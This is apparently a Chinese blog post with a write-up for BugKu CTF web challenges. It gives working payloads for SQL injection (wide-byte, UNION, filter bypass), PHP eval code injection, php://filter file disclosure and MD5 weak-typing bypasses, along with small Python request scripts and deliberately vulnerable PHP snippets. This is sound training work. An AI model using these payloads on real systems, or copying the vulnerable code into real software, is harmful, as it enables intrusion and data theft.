---
title: BugKu-CTF Web Write Up(1)
date: 2018-03-09 15:29:30
tags:
 - ctf
 - wp
---
[BugkuCTF-新版](http://ctf.bugku.com/challenges)
[Bugku-旧版](http://123.206.31.85/login?next=challenges)

<br>
### Web2
右键审查元素，仔细观察得到flag
<br>

### 文件上传测试
bp抓包，文件名后缀大小写绕过得到flag
<br>

### 计算题
页面有前端限制，右键源代码，更改input的maxlength属性，即可
<br>

### web基础`$_GET`
`url?what=flag`，得到flag
<br>

### web基础`$_POST`
HackBar发送post请求，POSTDATA为`what=flag`即可。

<br>

### 矛盾
```php
$num=$_GET['num'];
if(!is_numeric($num))
{
echo $num;
if($num==1)
echo 'flag{**********}';
}
```
传入`url?num=1a`
由于1a不是数字，所以能通过`!is_numeric()`的验证
利用PHP弱类型的松散性，`"1a"==1`，得到flag

<br>

### Web3
右键源代码，看见一串HTML实体编码，解码得到flag

<br>

### sql注入
```
http://103.238.227.13:10083/?id=0%df' union select 1,database() %23
http://103.238.227.13:10083/?id=0%df' union select 1,string from sql5.key %23
```
这道题有一个需要非常细心观察的地方，就是网页的编码格式为GB2312
如果有测试的话，会发现单引号会过滤或者转移，后来测试后发现是被转移，那么可以利用**宽字节注入**
在之后有一个无比坑爹的地方，就是直接查询key表会报错，然后想了半天，看看了下别人的writeup
原来是key在原本的查询过程中是字段名，在后者的查询是表明，那么就起了冲突，解决方法
 - 用反引号包住key
 - 直接指定库名

<br>

### 域名解析
如果直接去访问`flag.bugku.com`是不存在DNS解析的，所以直接访问IP地址，但是会显示400错误页面，则该地址不能直接用IP去访问。
其中有一个办法就是更改主机的HOST文件，即可。
然后我用的是另一个办法，访问IP地址后用BP抓包，在将Host修改为域名。(这边自己猜测他是根据HOST去判断的)
```http
GET / HTTP/1.1
Host: flag.bugku.com
Connection: close
```
<br>

### SQL注入1
```php
//过滤sql
$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');
foreach ($array as $value)
{
	if (substr_count($id, $value) > 0)
	{
		exit('包含敏感关键字！'.$value);
	}
}

//xss过滤
$id = strip_tags($id);

$query = "SELECT * FROM temp WHERE id={$id} LIMIT 1";
```
审计后会发现，页面先去判断是否有关键字存在，在去利用`strip_tags()`过滤xss
那么可以借助这点来构建
`http://103.238.227.13:10087/?id=1 unio<>n selec<>t 1,hash fro<>m `key`  %23`
<br>

### 你必须让他停下
进入页面会不断刷新页面，直接右键源代码，提示flag的位置，但是并没有
后面猜测flag是随机会刷出，利用bp抓包一段时间，直接筛选报文长度，得到不同的几个
观察后得到flag
<br>

### 本地包含
```php
include "waf.php";
include "flag.php";
$a = @$_REQUEST['hello'];
eval( "var_dump($a);");
show_source(__FILE__);
```
仔细审计后，其实传入变量可以执行任意代码了，可以选择闭合代码或者直接执行。
`http://120.24.86.145:8003/?hello=file("flag.php")`
`http://120.24.86.145:8003/?hello=);print_r(file("flag.php")`
<br>

### 变量1
```php
error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
```
审计有两个关键点，只能输入字母下划线，`var_dump($$args)`
那么可以打印php中的所有变量，如果flag值存在一个变量中的话。
`http://120.24.86.145:8004/index1.php?args=GLOBALS`
查看，得到flag
<br>

### Web4
右键查看源码，看见一串JS代码，扔到控制台里面执行，并且把eval改为alert，得到代码
```js
function checkSubmit(){
  var a=document.getElementById("password");
  if("undefined"!=typeof a){
    if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value)return!0;alert("Error");a.focus();return!1
  }
}
document.getElementById("levelQuest").onsubmit=checkSubmit;
```
审计后得知，其实只要发送一个post请求即可，因为这段js执行成功后也只是发送post请求
```
[POST DATA]
flag=67d709b2b54aa2aa648cf6e87a7114f1
```

<br>

### Web5
查看源代码，发现一段JSFuck编码后的字符串
直接扔到控制台运行，得到flag

<br>

### flag在index里
进入页面右键源代码，发现文件包含漏洞，根据题目直接利用php://filter得到index.php源码
`http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php`
<br>

### 输入密码查看flag
提示了5位密码，直接利用burp进行爆破，得到flag
<br>

### 前女友

<br>

### 点击一百万次
右键源代码,查看源代码，发现点击超过1000000次后会发送post请求，直接利用hackbar发送POST请求即可
```
[POST DATA]
clicks=999999999
```
<br>

### 听说备份是个好习惯
题目的备份提醒，直接访问index.php.bak，得到源码
```php
include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');
$str = substr($str,1);
$str = str_replace('key','',$str);
parse_str($str);
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
```
审计后发现对key进行过滤，并且需要满足md5后相等
那么利用php弱类型，以及双写或者url都可绕过
```
双写绕过
http://120.24.86.145:8002/web16/?kekeyy1=QNKCDZO&&kekeyy2=s878926199a

对key进行url编码
http://120.24.86.145:8002/web16/?%6b%65%791=QNKCDZO&&%6b%65%792=s878926199a

```
<br>

### 成绩单
```sql
id=0'||1 order by 5 #
id=0'||1 order by 4 #
id=0' union select 1,2,3,4 #
id=0' union select 1,2,3,database() #           -- skctf_flag
id=0' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema= 0x736b6374665f666c6167 #   -- fl4g,sc
id=0' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name= 0x666c3467 #   -- skctf_flag
id=0' union select 1,2,3,skctf_flag from fl4g #                     '
```

<br>

### 秋名山老司机
利用python脚本跑出flag即可，需要运行多次
```python
import requests
import re

url = "http://120.24.86.145:8002/qiumingshan/"
s = requests.Session()
response = s.get(url).text
data = re.findall(r"<div>(.*)</div>", response)
print(data)
value = eval(data.pop().split("=")[0])
print(value)
datas = {"value": value}
print(s.post(url, data=datas).text)
```
<br>

### 速度要快
需要注意的就是两次base64编码，以及保持Session
```python
import requests
import base64

s = requests.Session()
url = "http://120.24.86.145:8002/web6/"
data = s.get(url).headers["flag"]
print(data)
data = str(base64.b64decode(data), encoding="utf-8")
print(data)
data = base64.b64decode(data.split(": ")[1])
print(data)
data = {"margin": data}
print(s.post(url, data=data).text)
```

<br>

### cookies欺骗？？
对url的filename参数进行解密，知道了，页面能读取任意文件，写python脚本如下
```python
import requests
import base64

url = "http://120.24.86.145:8002/web11/index.php"
filename = base64.b64encode(b"index.php")
for i in range(50):
    data = {"line": i, "filename": filename}
    line = requests.get(url, params=data).text
    print(line)
    with open("index.php", "a") as f:
        f.write(line)
```
得到index.php源码
```php
error_reporting(0);
$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
$line=isset($_GET['line'])?intval($_GET['line']):0;
if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
$file_list = array(
'0' =>'keys.txt',
'1' =>'index.php',
);
if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){
$file_list[2]='keys.php';
}
if(in_array($file, $file_list)){
$fa = file($file);
echo $fa[$line];
}
```
审计分析后，需要满足cookie中带有margin值，并且margin=margin，利用burp重发请求包
```http
GET /web11/index.php?line=0&filename=a2V5cy5waHA= HTTP/1.1
Host: 120.24.86.145:8002
Cookie: PHPSESSID=fr0hdcb1acm2mn5r2f867d1c9i672g78; margin=margin
```
得到flag
<br>

### XSS

<br>
